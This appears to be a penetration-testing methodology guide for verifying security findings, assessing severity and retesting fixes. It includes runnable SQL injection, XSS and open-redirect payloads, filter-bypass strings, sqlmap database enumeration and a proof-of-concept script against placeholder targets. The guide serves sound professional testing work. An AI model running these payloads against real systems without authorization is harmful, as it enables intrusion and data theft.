# Finding Verification Methodology Guide

Comprehensive methodology for confirming security findings are real, validating their severity, and verifying that remediations actually work.

---

## 1. Six-Phase Verification Process

The verification loop defined in SKILL.md establishes a six-phase protocol. This guide expands each phase with practical techniques, decision criteria, and worked examples.

```text
Phase 1: Pre-Condition Check     → Define what "confirmed" means
Phase 2: Execute & Observe       → Reproduce the original finding
Phase 3: Post-Condition Check    → Verify the expected outcome occurred
Phase 4: Independent Confirmation → Reproduce with a DIFFERENT method
Phase 5: False Positive Elimination → Rule out environmental artifacts
Phase 6: Evidence Documentation  → Package the proof
```

### Phase Dependency Chain

Each phase gates the next. If a phase fails, the finding does not advance.

```text
Phase 1 → Phase 2 → Phase 3 → Phase 4 → Phase 5 → Phase 6
  │          │          │          │          │
  FAIL       FAIL       FAIL       FAIL       FAIL
  ↓          ↓          ↓          ↓          ↓
  STOP:      STOP:      STOP:      STOP:      STOP:
  Missing    Cannot     Expected   Cannot     Likely
  criteria   reproduce  outcome    confirm    false
             finding    not seen   indep.     positive
```

### Phase Timing Guidelines

```text
Phase 1: Pre-Condition       →  5-10 minutes (setup and planning)
Phase 2: Execute & Observe   → 10-30 minutes (depends on finding type)
Phase 3: Post-Condition      →  5-10 minutes (check results)
Phase 4: Independent Confirm → 15-45 minutes (different tool/method)
Phase 5: False Positive Elim → 10-20 minutes (systematic elimination)
Phase 6: Evidence Document   → 15-30 minutes (write-up and packaging)

Total: 60-145 minutes per finding (budget accordingly)
```

---

## 2. False Positive Elimination Strategies

False positives waste client time, damage credibility, and dilute real findings. Systematic elimination is the most important step in the verification loop.

### 2.1 Multi-Tool Confirmation

Never trust a single tool's output. Every finding must be confirmed by at least two independent sources.

```bash
# Example: Nessus reports MS17-010 (EternalBlue) on 192.168.1.50

# Tool 1: Nessus plugin output (original finding)
# Plugin ID: 97833, Severity: Critical

# Tool 2: Nmap NSE script confirmation
nmap -p445 --script smb-vuln-ms17-010 192.168.1.50 2>&1 | tee verify_ms17010_nmap.log

# Tool 3: Metasploit check (non-exploit verification)
msfconsole -q -x "
  use auxiliary/scanner/smb/smb_ms17_010;
  set RHOSTS 192.168.1.50;
  run;
  exit
" 2>&1 | tee verify_ms17010_msf.log

# Tool 4: CrackMapExec check
crackmapexec smb 192.168.1.50 --check 2>&1 | tee verify_ms17010_cme.log
```

### 2.2 Manual Validation

Automated tools often misinterpret responses. Manual validation catches what scanners miss.

```bash
# Example: Scanner reports open redirect at /login?next=

# Automated finding:
# URL: http://target.com/login?next=http://evil.com
# Tool says: Open Redirect (Medium)

# Manual validation step 1: Test the exact URL
curl -s -o /dev/null -w "%{redirect_url}\n%{http_code}\n" \
  "http://target.com/login?next=http://evil.com" | tee manual_redirect_test.log

# Manual validation step 2: Check if redirect actually follows
curl -sL -o /dev/null -w "%{url_effective}\n" \
  "http://target.com/login?next=http://evil.com" | tee manual_redirect_follow.log

# Manual validation step 3: Try variations
for payload in "//evil.com" "http://evil.com%00" "/\evil.com" "http://evil.com@target.com"; do
  echo "=== Testing: $payload ===" | tee -a manual_redirect_variations.log
  curl -s -o /dev/null -w "Code: %{http_code} | Redirect: %{redirect_url}\n" \
    "http://target.com/login?next=$payload" | tee -a manual_redirect_variations.log
done
```

### 2.3 Context Analysis

Understanding why a tool flagged something often reveals whether the finding is real.

```text
Context Analysis Checklist:
  [ ] What triggered the alert? (specific response pattern, version string, header)
  [ ] Is the trigger reliable? (known false positive signature?)
  [ ] Does the target match the vulnerability conditions? (correct version, config, platform)
  [ ] Is there a WAF/proxy/CDN between scanner and target? (may alter responses)
  [ ] Was the scan run with correct credentials/access level?
```

### 2.4 The Three-Strike Rule

```text
Strike 1: Original tool reports finding       → Potential finding
Strike 2: Second tool confirms                → Probable finding
Strike 3: Manual validation confirms          → Confirmed finding

If any strike misses:
  - 1 confirmation only    → Flag for deeper investigation
  - 0 confirmations        → Mark as false positive, document why
```

---

## 3. Independent Confirmation Techniques

Phase 4 requires reproducing a finding via a fundamentally different method. Using the same tool with different flags does not count.

### 3.1 Method Selection Matrix

| Finding Type | Original Method | Independent Method 1 | Independent Method 2 |
|-------------|----------------|---------------------|---------------------|
| SQL Injection | SQLmap | Manual curl with payloads | Python script with requests |
| XSS (Reflected) | Burp Scanner | Manual browser test | curl with payload + grep response |
| XSS (Stored) | Burp Scanner | Direct API call + fetch rendered page | Selenium/headless browser |
| Open Port | Nmap | Netcat/ncat manual probe | Masscan confirmation |
| SSL/TLS Issue | SSLyze | testssl.sh | openssl s_client manual |
| Auth Bypass | Burp Repeater | curl with session tokens | Python requests script |
| SSRF | Manual testing | OOB callback (Burp Collaborator) | DNS-based confirmation |
| File Upload | Manual browser | curl multipart upload | Python script |
| IDOR | Burp Repeater | curl with different auth tokens | API client (Postman/httpie) |

### 3.2 SQL Injection Independent Confirmation

```bash
# Original finding: SQLmap detected SQL injection
# sqlmap -u "http://target.com/api/user?id=1" --batch

# Independent Method 1: Manual curl with time-based payload
# Baseline response time
time curl -s -o /dev/null "http://target.com/api/user?id=1"
# Time-based injection test
time curl -s -o /dev/null "http://target.com/api/user?id=1%20AND%20SLEEP(5)"
# If second request takes ~5 seconds longer, injection is confirmed

# Independent Method 2: Boolean-based manual confirmation
# True condition (should return normal response)
curl -s "http://target.com/api/user?id=1%20AND%201=1" | head -5
# False condition (should return different response)
curl -s "http://target.com/api/user?id=1%20AND%201=2" | head -5
# Compare response sizes
curl -s -o /dev/null -w "%{size_download}" "http://target.com/api/user?id=1%20AND%201=1"
curl -s -o /dev/null -w "%{size_download}" "http://target.com/api/user?id=1%20AND%201=2"

# Independent Method 3: Python script
python3 << 'PYEOF'
import requests, time

base_url = "http://target.com/api/user"

# Baseline
start = time.time()
r1 = requests.get(base_url, params={"id": "1"})
baseline = time.time() - start

# Time-based test
start = time.time()
r2 = requests.get(base_url, params={"id": "1 AND SLEEP(5)"})
injected = time.time() - start

print(f"Baseline: {baseline:.2f}s")
print(f"Injected: {injected:.2f}s")
print(f"Delta: {injected - baseline:.2f}s")
print(f"Verdict: {'CONFIRMED' if injected - baseline > 4 else 'NOT CONFIRMED'}")
PYEOF
```

### 3.3 XSS Independent Confirmation

```bash
# Original finding: Burp found reflected XSS in search parameter

# Independent Method 1: curl + grep for unescaped reflection
curl -s "http://target.com/search?q=<script>alert(1)</script>" | \
  grep -o '<script>alert(1)</script>' | tee xss_confirm_curl.log

# Check: was the payload reflected without encoding?
curl -s "http://target.com/search?q=<script>alert(1)</script>" | \
  grep -cP '<script>alert\(1\)</script>'
# If count > 0, the payload is reflected unescaped

# Independent Method 2: Different payload vector
curl -s "http://target.com/search?q=<img%20src=x%20onerror=alert(1)>" | \
  grep -o 'onerror=alert(1)' | tee xss_confirm_img.log

# Independent Method 3: Encoding bypass test
for payload in \
  "%3Cscript%3Ealert(1)%3C/script%3E" \
  "<svg/onload=alert(1)>" \
  "javascript:alert(1)" \
  "<details/open/ontoggle=alert(1)>"; do
  echo "=== Payload: $payload ===" | tee -a xss_variations.log
  curl -s "http://target.com/search?q=$payload" | \
    grep -c "alert(1)" | tee -a xss_variations.log
done
```

---

## 4. Severity Validation

A finding is only as severe as its real-world impact. Scanner-assigned severity often needs adjustment.

### 4.1 CVSS Scoring Verification

```text
Verify each CVSS component against observed behavior:

Attack Vector (AV):
  Network (N) → Can you reach the vuln from the network? Verify with remote test.
  Adjacent (A) → Requires local network access? Verify by testing from outside.
  Local (L)   → Requires local access? Verify that remote exploitation fails.
  Physical (P) → Requires physical access? Verify.

Attack Complexity (AC):
  Low (L)  → Exploit works reliably every time? Run 5 attempts, count successes.
  High (H) → Requires specific conditions? Document the conditions.

Privileges Required (PR):
  None (N) → Works without authentication? Test from unauthenticated session.
  Low (L)  → Requires basic user? Test with lowest-privilege account.
  High (H) → Requires admin? Verify it fails with low-privilege account.

User Interaction (UI):
  None (N)    → Exploit fires without user action? Verify with automated request.
  Required (R) → Needs user click/action? Document the required interaction.
```

### 4.2 Impact Assessment

```bash
# After confirming a SQL injection, assess actual impact

# Can we read data?
sqlmap -u "http://target.com/api/user?id=1" --batch --dbs 2>&1 | tee impact_dbs.log

# Can we read sensitive tables?
sqlmap -u "http://target.com/api/user?id=1" --batch -D production_db --tables 2>&1 | \
  tee impact_tables.log

# Can we write data? (ONLY if authorized in scope)
# sqlmap -u "..." --batch --os-shell  # CAUTION: destructive

# Can we escalate to OS command execution?
sqlmap -u "http://target.com/api/user?id=1" --batch --is-dba 2>&1 | tee impact_dba.log
```

### 4.3 Exploitability Confirmation

```text
Exploitability Checklist:
  [ ] Exploit works reliably (>80% success rate in 5 attempts)
  [ ] Exploit works from the expected attack position (network, adjacent, etc.)
  [ ] Exploit does not require unrealistic preconditions
  [ ] Exploit payload is practical (not just a PoC, but achieves real impact)
  [ ] Time to exploit is reasonable (minutes to hours, not days)

Rating:
  Easily exploitable  → Works on first attempt, no special conditions
  Moderately exploitable → Requires some setup or specific conditions
  Difficult to exploit → Requires race conditions, specific timing, or chaining
  Theoretical only → Cannot demonstrate practical exploitation
```

---

## 5. Remediation Verification Protocol

Verifying that a fix actually works is just as important as finding the original vulnerability.

### 5.1 Re-Testing After Fix

```bash
# Step 1: Record the pre-fix state (should already exist from initial finding)
echo "=== REMEDIATION VERIFICATION: FIND-001-sqli ===" | tee -a remediation.log
echo "=== Pre-fix evidence: findings/FIND-001-sqli/output/ ===" | tee -a remediation.log

# Step 2: Attempt the EXACT original exploit
echo "=== $(date -u +%Y-%m-%dT%H:%M:%SZ) | Re-testing original exploit ===" | tee -a remediation.log
sqlmap -u "http://target.com/api/user?id=1" --batch --level=3 2>&1 | \
  tee remediation_retest_original.log

# Step 3: Check the result
grep -c "is vulnerable" remediation_retest_original.log
# 0 = original exploit blocked
# >0 = FIX DID NOT WORK
```

### 5.2 Regression Checks

```bash
# After verifying the specific fix, check for regressions

# Test other parameters on the same endpoint
for param in "name" "email" "sort" "limit" "offset"; do
  echo "=== Testing param: $param ===" | tee -a regression_check.log
  sqlmap -u "http://target.com/api/user?${param}=test" --batch --level=2 2>&1 | \
    grep "is vulnerable" | tee -a regression_check.log
done

# Test similar endpoints
for endpoint in "/api/search" "/api/products" "/api/orders"; do
  echo "=== Testing endpoint: $endpoint ===" | tee -a regression_check.log
  sqlmap -u "http://target.com${endpoint}?q=test" --batch --level=2 2>&1 | \
    grep "is vulnerable" | tee -a regression_check.log
done
```

### 5.3 Bypass Attempts

A fix that only blocks the specific exploit payload is incomplete. Test bypass techniques.

```bash
# SQL injection bypass attempts after fix

# Test different injection techniques
echo "=== Bypass Attempts ===" | tee -a bypass_test.log

# Inline comments
curl -s "http://target.com/api/user?id=1'/**/OR/**/1=1--" | tee -a bypass_test.log

# Case variation
curl -s "http://target.com/api/user?id=1'%20oR%201=1--" | tee -a bypass_test.log

# Double encoding
curl -s "http://target.com/api/user?id=1%2527%2520OR%25201=1--" | tee -a bypass_test.log

# Unicode encoding
curl -s "http://target.com/api/user?id=1%ef%bc%87%20OR%201=1--" | tee -a bypass_test.log

# Alternative operators
curl -s "http://target.com/api/user?id=1'%20||%201=1--" | tee -a bypass_test.log

# Nested injection
curl -s "http://target.com/api/user?id=1';WAITFOR%20DELAY%20'0:0:5'--" | tee -a bypass_test.log
```

### 5.4 Remediation Verdict

```text
PATCHED:
  - Original exploit fails
  - Bypass attempts fail
  - Regression checks pass
  - Fix addresses root cause (parameterized queries, not just input filtering)

PARTIALLY PATCHED:
  - Original exploit fails
  - BUT: some bypass attempts succeed
  - OR: same vulnerability exists on other endpoints
  - OR: fix is input-filtering only (not root cause)

NOT PATCHED:
  - Original exploit still succeeds
  - Fix was not applied or was applied incorrectly
  - Document exact failure for re-remediation
```

---

## 6. Evidence Documentation for Verified Findings

Every confirmed finding needs a complete evidence package that a third party could use to reproduce the issue.

### 6.1 Request/Response Pair Documentation

```bash
# Capture full request and response with curl
curl -v -o response_body.html \
  "http://target.com/api/user?id=1'%20OR%201=1--" \
  2> request_response_headers.txt

# Capture with timing information
curl -w "@curl_format.txt" -o response.html -s \
  "http://target.com/api/user?id=1'%20OR%201=1--" \
  > timing_info.txt

# curl_format.txt contents:
cat > curl_format.txt << 'EOF'
     time_namelookup:  %{time_namelookup}s\n
        time_connect:  %{time_connect}s\n
     time_appconnect:  %{time_appconnect}s\n
    time_pretransfer:  %{time_pretransfer}s\n
       time_redirect:  %{time_redirect}s\n
  time_starttransfer:  %{time_starttransfer}s\n
                     ----------\n
          time_total:  %{time_total}s\n
       size_download:  %{size_download} bytes\n
         http_code:    %{http_code}\n
EOF
```

### 6.2 Proof-of-Concept Scripts

```bash
# For each confirmed finding, create a standalone PoC script

cat > findings/FIND-001-sqli/poc.sh << 'POCEOF'
#!/bin/bash
# PoC: SQL Injection in /api/user endpoint
# Finding: FIND-001-sqli
# Severity: Critical (CVSS 9.8)
# Date: 2026-05-22
#
# Usage: ./poc.sh <target_url>
# Example: ./poc.sh http://target.com
#
# Prerequisites: curl
# Impact: Full database read access

TARGET=${1:?"Usage: $0 <target_url>"}

echo "[*] Testing SQL Injection on $TARGET/api/user"
echo "[*] Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"

# Test 1: Boolean-based confirmation
echo "[*] Test 1: Boolean-based detection"
TRUE_SIZE=$(curl -s -o /dev/null -w "%{size_download}" "$TARGET/api/user?id=1%20AND%201=1")
FALSE_SIZE=$(curl -s -o /dev/null -w "%{size_download}" "$TARGET/api/user?id=1%20AND%201=2")
echo "    True condition response size:  $TRUE_SIZE bytes"
echo "    False condition response size: $FALSE_SIZE bytes"

if [ "$TRUE_SIZE" != "$FALSE_SIZE" ]; then
  echo "[+] CONFIRMED: Boolean-based SQL injection (different response sizes)"
else
  echo "[-] Boolean test inconclusive"
fi

# Test 2: Time-based confirmation
echo "[*] Test 2: Time-based detection"
BASELINE=$(curl -s -o /dev/null -w "%{time_total}" "$TARGET/api/user?id=1")
DELAYED=$(curl -s -o /dev/null -w "%{time_total}" "$TARGET/api/user?id=1%20AND%20SLEEP(5)")
echo "    Baseline response time: ${BASELINE}s"
echo "    Delayed response time:  ${DELAYED}s"

DELTA=$(echo "$DELAYED - $BASELINE" | bc 2>/dev/null || echo "0")
echo "    Delta: ${DELTA}s"

echo "[*] Done. Review output above for confirmation."
POCEOF
chmod +x findings/FIND-001-sqli/poc.sh
```

### 6.3 Screenshot Capture Protocol

```text
Required screenshots per finding:

1. VULNERABLE STATE:
   - The request showing the exploit payload
   - The response showing the vulnerability triggered
   - The browser/tool output demonstrating impact

2. EVIDENCE OF IMPACT:
   - Data extracted (redact sensitive content)
   - Unauthorized access achieved
   - System state changed

3. REMEDIATION STATE (if verifying fix):
   - Same request after fix applied
   - Response showing the fix works
   - Bypass attempt failures

Naming: FIND-<ID>_<type>_<sequence>.png
  FIND-001_vuln_request_01.png
  FIND-001_vuln_response_02.png
  FIND-001_impact_data_03.png
  FIND-001_remediated_01.png
```

---

## 7. Verification Decision Trees

Flowcharts for verifying the most common finding types. Follow the tree from top to bottom; each node is a verification action.

### 7.1 SQL Injection Decision Tree

```text
SQLi Finding Reported
  │
  ├── Step 1: Reproduce with original payload
  │   ├── FAILS → Check: payload encoding correct? Target changed?
  │   │   ├── Encoding issue → Fix and retry
  │   │   ├── Target patched → Mark as remediated
  │   │   └── Cannot reproduce → NOT CONFIRMED
  │   └── SUCCEEDS → Continue
  │
  ├── Step 2: Confirm injection type
  │   ├── Error-based → capture database error in response
  │   ├── Boolean-based → compare true/false condition responses
  │   ├── Time-based → measure response time delta (>4s = confirmed)
  │   ├── UNION-based → extract data via UNION SELECT
  │   └── Out-of-band → DNS/HTTP callback confirmation
  │
  ├── Step 3: Independent confirmation
  │   ├── Used SQLmap? → Confirm with manual curl
  │   ├── Used curl? → Confirm with Python script
  │   └── Must use DIFFERENT tool/method
  │
  ├── Step 4: False positive check
  │   ├── Is response time variable anyway? (noisy network)
  │   ├── Does the application have legitimate slow queries?
  │   ├── Is a WAF generating the "error" response?
  │   └── Does the "extracted data" come from the app, not injection?
  │
  └── Step 5: Severity assessment
      ├── Can read arbitrary data? → Critical
      ├── Can read limited data? → High
      ├── Can detect boolean conditions only? → Medium
      └── Theoretical only (blind, no data extraction)? → Low
```

### 7.2 XSS Decision Tree

```text
XSS Finding Reported
  │
  ├── Step 1: Identify XSS type
  │   ├── Reflected → payload in URL/request, reflected in response
  │   ├── Stored → payload persisted, fires on page load
  │   └── DOM-based → payload processed client-side only
  │
  ├── Step 2: Reproduce with original payload
  │   ├── FAILS → Check: WAF blocking? Encoding issue? CSP?
  │   └── SUCCEEDS → Continue
  │
  ├── Step 3: Verify execution context
  │   ├── Does JavaScript actually execute? (not just rendered as text)
  │   ├── Does it fire in a relevant browser context?
  │   ├── Can it access cookies/session? (check HttpOnly flag)
  │   └── Is there a Content-Security-Policy blocking execution?
  │
  ├── Step 4: Independent confirmation
  │   ├── Different payload vector (script → img → svg → details)
  │   ├── Different injection point (same param via API vs browser)
  │   └── Different browser/user-agent
  │
  ├── Step 5: False positive check
  │   ├── Is the payload reflected but inside a comment/attribute?
  │   ├── Is there CSP that prevents actual exploitation?
  │   ├── Does the payload only work in an outdated browser?
  │   └── Is the "reflection" actually sanitized (HTML entities)?
  │
  └── Step 6: Severity assessment
      ├── Stored + session hijack possible? → High/Critical
      ├── Reflected + requires user click? → Medium
      ├── DOM-based + self-XSS only? → Low/Info
      └── Blocked by CSP? → Info (note CSP bypass potential)
```

### 7.3 SSRF Decision Tree

```text
SSRF Finding Reported
  │
  ├── Step 1: Confirm server-side request
  │   ├── Use out-of-band callback (Burp Collaborator, interactsh)
  │   ├── Request http://your-server/ → check access log
  │   └── No callback received → NOT CONFIRMED
  │
  ├── Step 2: Assess reach
  │   ├── Can access internal IPs? (127.0.0.1, 10.x, 172.16.x, 192.168.x)
  │   ├── Can access cloud metadata? (169.254.169.254)
  │   ├── Can access other protocols? (file://, gopher://, dict://)
  │   └── Limited to HTTP only? → Lower severity
  │
  ├── Step 3: Independent confirmation
  │   ├── Different URL schemes
  │   ├── Different internal targets
  │   └── DNS rebinding technique
  │
  ├── Step 4: False positive check
  │   ├── Is the server just fetching a URL preview (intended feature)?
  │   ├── Is there a whitelist limiting targets?
  │   ├── Does the response content actually come from the internal target?
  │   └── Is the "callback" from a proxy, not the target server?
  │
  └── Step 5: Severity assessment
      ├── Cloud metadata accessible? → Critical
      ├── Internal network scanning possible? → High
      ├── Arbitrary external requests? → Medium
      └── Limited URL fetch, no internal access? → Low
```

### 7.4 Authentication Bypass Decision Tree

```text
Auth Bypass Finding Reported
  │
  ├── Step 1: Reproduce the bypass
  │   ├── Clear all auth state (cookies, tokens, headers)
  │   ├── Attempt to access the protected resource
  │   ├── BLOCKED → original bypass may have been a session artifact
  │   └── ACCESS GRANTED → Continue
  │
  ├── Step 2: Verify bypass type
  │   ├── Missing auth check → resource accessible without any auth
  │   ├── Broken auth → valid token from user A accesses user B data
  │   ├── Token manipulation → modified JWT/cookie grants access
  │   ├── Path traversal → different URL path bypasses auth middleware
  │   └── HTTP method → changing GET to POST (or vice versa) bypasses
  │
  ├── Step 3: Independent confirmation
  │   ├── Different browser/client (clear all cached state)
  │   ├── Different user account
  │   ├── curl from a clean environment
  │   └── Automated script with no stored auth
  │
  ├── Step 4: False positive check
  │   ├── Is the resource supposed to be public?
  │   ├── Was there a cached session/token?
  │   ├── Is a load balancer routing to a different backend?
  │   └── Is the "bypass" only partial (read-only, no write)?
  │
  └── Step 5: Severity assessment
      ├── Admin access without auth? → Critical
      ├── Other user data access? → High
      ├── Own data via unintended path? → Medium
      └── Public data via unintended path? → Low
```

---

## 8. Common Verification Pitfalls

Experienced testers still fall into these traps. Recognize and avoid them.

### 8.1 WAF Interference

```text
Problem: WAF blocks the exploit payload, making it appear the vulnerability
         does not exist (false negative) or the remediation works (false fix).

Detection:
  - Response contains WAF signature (403 with specific body, custom headers)
  - Response time is suspiciously consistent (WAF short-circuits processing)
  - Different payloads get identical rejection responses

Mitigation:
  - Test from an IP within the WAF whitelist (if authorized)
  - Test the application directly, bypassing the WAF (if accessible)
  - Use WAF bypass techniques to confirm the underlying vulnerability
  - Document: "Vulnerability exists at application layer; WAF provides
    defense-in-depth but is not a fix"
```

```bash
# Detect WAF presence
wafw00f http://target.com 2>&1 | tee waf_detection.log

# Check for common WAF headers
curl -sI http://target.com | grep -iE "x-waf|x-sucuri|x-cdn|cf-ray|x-akamai" | \
  tee waf_headers.log

# Test if WAF blocks generic attack pattern
curl -s -o /dev/null -w "%{http_code}" \
  "http://target.com/?q=<script>alert(1)</script>"
# 403 or custom page = WAF likely active
```

### 8.2 Load Balancer Inconsistency

```text
Problem: Load balancer routes requests to different backend servers.
         One server may be patched while another is not. Results vary
         between test attempts.

Detection:
  - Inconsistent results on repeated identical requests
  - Different server headers on successive requests
  - Finding appears and disappears between tests

Mitigation:
  - Identify all backend servers (via response headers, timing, cookies)
  - Pin to a specific backend if possible (sticky session, server header)
  - Test multiple times and record which backend each request hit
  - Report: "X out of Y backends are vulnerable"
```

```bash
# Detect load balancer by repeated requests
for i in $(seq 1 10); do
  curl -sI http://target.com | grep -i "server\|x-backend\|x-served-by" | \
    head -1
done | sort | uniq -c | sort -rn | tee lb_detection.log
```

### 8.3 Time-Based False Positives

```text
Problem: Network latency, server load, or database performance causes
         natural response time variations that look like time-based injection.

Detection:
  - Baseline response times vary by more than 2 seconds
  - "Confirmed" delay matches network jitter, not injection delay
  - Delay is present even without injection payload

Mitigation:
  - Measure baseline at least 5 times, calculate average and stddev
  - Use injection delays of 10+ seconds (well above natural variation)
  - Compare injection delay vs. baseline statistically
  - Test at different times to account for server load variations
```

```bash
# Establish robust baseline
echo "=== Baseline Measurements ===" | tee timing_baseline.log
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{time_total}\n" "http://target.com/api/user?id=1" | \
    tee -a timing_baseline.log
done

# Calculate average baseline
awk '{sum+=$1; count++} END {print "Average:", sum/count, "seconds"}' timing_baseline.log

# Test with large delay to distinguish from jitter
echo "=== Injection Test (10s delay) ===" | tee -a timing_baseline.log
for i in $(seq 1 3); do
  curl -s -o /dev/null -w "%{time_total}\n" \
    "http://target.com/api/user?id=1%20AND%20SLEEP(10)" | \
    tee -a timing_baseline.log
done
```

### 8.4 Confirmation Bias

```text
Problem: Tester unconsciously adjusts methodology to confirm the finding
         they expect to find.

Symptoms:
  - Trying 20 different payloads until one "works"
  - Interpreting ambiguous output as confirmation
  - Ignoring evidence that contradicts the finding
  - Adjusting CVSS score upward without evidence

Prevention:
  - Define success criteria BEFORE testing (Phase 1)
  - Document failures alongside successes
  - Have a second tester independently verify critical findings
  - Use the exact original payload first, without modification
```

### 8.5 Scope and Environment Drift

```text
Problem: The target environment changed between initial finding and
         verification (deployment, config change, different test server).

Detection:
  - Version strings differ from initial finding
  - Response structure changed
  - New security controls appeared

Mitigation:
  - Record server version/fingerprint during initial finding AND verification
  - Confirm you are testing the same environment
  - If environment changed, note this in the verification report
```

---

## 9. Integration with Reporting

The verification loop directly determines what goes into the final pentest report and at what confidence level.

### 9.1 Verified vs. Unverified Findings

```text
REPORTING RULES:

CONFIRMED (Phase 6 complete):
  → Include in report with full evidence
  → Assign severity based on CVSS verification (Section 4)
  → Include reproduction steps

PARTIALLY CONFIRMED (Phases 1-3 pass, Phase 4 or 5 incomplete):
  → Include in report with caveats
  → Mark as "Partially Verified"
  → Lower confidence rating
  → Explain what was confirmed and what was not

NOT CONFIRMED (any phase fails):
  → Do NOT include in main findings
  → Move to appendix as "Investigated but not confirmed"
  → Document why it was not confirmed

INCONCLUSIVE (Phase 5 cannot rule out false positive):
  → Include in report as "Requires Further Investigation"
  → Assign lower severity
  → Recommend client investigation
```

### 9.2 Confidence Levels

```text
Confidence Level Definitions:

HIGH (95%+):
  - All six phases completed successfully
  - Multiple independent confirmation methods agree
  - False positive analysis is thorough and clean
  - PoC script works reliably

MEDIUM (70-94%):
  - Phases 1-4 completed, Phase 5 has minor open questions
  - One independent confirmation method succeeded
  - Some environmental factors could not be fully controlled
  - PoC works but not 100% reliably

LOW (40-69%):
  - Original finding reproduced, but independent confirmation is weak
  - False positive analysis has gaps
  - Environmental factors may be contributing
  - PoC requires specific conditions

INFORMATIONAL (<40%):
  - Finding observed but not reliably reproduced
  - Tool-specific output, no independent confirmation
  - Possible false positive, but cannot fully rule out
```

### 9.3 Verification Summary Template

```markdown
# Verification Summary

## Engagement: [Client Name]
## Date: [Date]
## Verified By: [Operator]

### Findings Summary

| ID | Finding | Original Severity | Verified Severity | Confidence | Verdict |
|----|---------|------------------|-------------------|------------|---------|
| FIND-001 | SQL Injection in /api/user | Critical | Critical | High | CONFIRMED |
| FIND-002 | Reflected XSS in /search | Medium | Medium | High | CONFIRMED |
| FIND-003 | Open redirect in /login | Medium | Low | Medium | PARTIALLY CONFIRMED |
| FIND-004 | SSL/TLS weak cipher | Medium | N/A | N/A | NOT CONFIRMED (FP) |

### False Positives Identified

| ID | Original Finding | Reason for FP Classification |
|----|-----------------|------------------------------|
| FIND-004 | SSL/TLS weak cipher | Scanner misidentified negotiated cipher; actual cipher is TLS 1.3 AES-256-GCM |

### Verification Statistics

- Total findings investigated: [count]
- Confirmed: [count] ([percentage]%)
- Partially confirmed: [count] ([percentage]%)
- Not confirmed (false positive): [count] ([percentage]%)
- Inconclusive: [count] ([percentage]%)
```

### 9.4 Per-Finding Evidence Package Checklist

```text
For each CONFIRMED finding, the evidence package must include:

  [ ] Finding ID and description
  [ ] CVSS score with component breakdown
  [ ] Pre-condition baseline (Phase 1)
  [ ] Original exploitation evidence (Phase 2)
  [ ] Post-condition confirmation (Phase 3)
  [ ] Independent confirmation method and result (Phase 4)
  [ ] False positive analysis (Phase 5)
  [ ] Reproduction steps (exact commands)
  [ ] PoC script (standalone, documented)
  [ ] Request/response pairs
  [ ] Screenshots (if applicable)
  [ ] Remediation recommendation
  [ ] Remediation verification result (if re-testing)
```

---

## Quick Reference Card

```text
VERIFICATION FLOW:
  Pre-Condition → Execute → Post-Condition → Independent → FP Eliminate → Document

MINIMUM CONFIRMATION:
  2 tools + 1 manual test = confirmed
  1 tool only = unconfirmed (investigate further)

CONFIDENCE LEVELS:
  High (95%+) | Medium (70-94%) | Low (40-69%) | Info (<40%)

VERDICTS:
  CONFIRMED | PARTIALLY CONFIRMED | NOT CONFIRMED | INCONCLUSIVE

THREE-STRIKE RULE:
  Strike 1: Original tool     → Potential
  Strike 2: Second tool       → Probable
  Strike 3: Manual validation → Confirmed

REMEDIATION VERDICTS:
  PATCHED | PARTIALLY PATCHED | NOT PATCHED

FALSE POSITIVE RED FLAGS:
  - Single tool only
  - WAF present but not accounted for
  - Response times naturally variable
  - Environment different from production
  - Scanner version-matched (not exploit-confirmed)
```
